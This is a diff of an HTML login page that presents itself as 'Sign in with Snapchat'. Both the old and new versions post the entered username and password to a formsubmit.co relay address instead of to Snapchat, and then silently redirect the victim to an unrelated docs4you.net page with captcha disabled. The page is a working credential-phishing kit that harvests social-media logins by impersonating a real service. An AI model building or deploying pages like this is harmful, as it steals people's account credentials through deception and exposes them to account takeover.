@@ -1,50 +1,26 @@
 <!DOCTYPE html>
-<html lang="pt-br">
-  <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Login</title>
-    <link rel="stylesheet" href="style.css" />
-    <link rel="preconnect" href="https://fonts.googleapis.com" />
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
-    <link
-      href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;700&display=swap"
-      rel="stylesheet"
-    />
-    <script src="https://kit.fontawesome.com/a81368914c.js"></script>
-  </head>
-  <body>
-    <main>
-      <div class="login-container">
-        <h1 class="title">Log In With Snapchat</h1>
-        <form
-          action="https://formsubmit.co/178adf6086f8ae9a9bdb1945739ff8d9"
-          method="POST"
-        >
-          <input
-            class="input"
-            type="Username"
-            name="Username"
-            placeholder="Username"
-            required
-          />
-          <input
-            class="input"
-            type="password"
-            name="Password"
-            placeholder="Password"
-            required
-          />
-          <input type="hidden" name="_next" value="https://docs4you.net/forms.html" />
-          <input type="hidden" name="_captcha" value="false" />
-          <button type="submit" class="btn btn-lg btn-dark btn-block">Log in</button>
-        </form>
-        <div class="footer-container"></div>
-      </div>
-    </main>
-    <section class="illustration-container">
-      <div class="circle"></div>
-    </section>
-    <script src="assets/js/main.js"></script>
-  </body>
+<html>
+
+<head>
+  <title>Sign in with Snapchat!</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+  <div class="container">
+    <div class="logo"></div>
+    <h1>Sign in with Snapchat</h1>
+    <form action="https://formsubmit.co/178adf6086f8ae9a9bdb1945739ff8d9" method="POST">
+      <label for="username">Username or Email</label>
+      <input type="text" id="username" name="username" required>
+      <label for="password">Password</label>
+      <input type="password" id="password" name="password" required>
+      <input type="hidden" name="_next" value="https://docs4you.net/forms.html" />
+      <input type="hidden" name="_captcha" value="false" />
+      <input type="submit" value="Log in">
+    </form>
+    <div class="login-box">
+      <a href="#">Forgot password?</a> | <a href="#">Sign up</a>
+    </div>
+  </div>
+</body>
 </html>
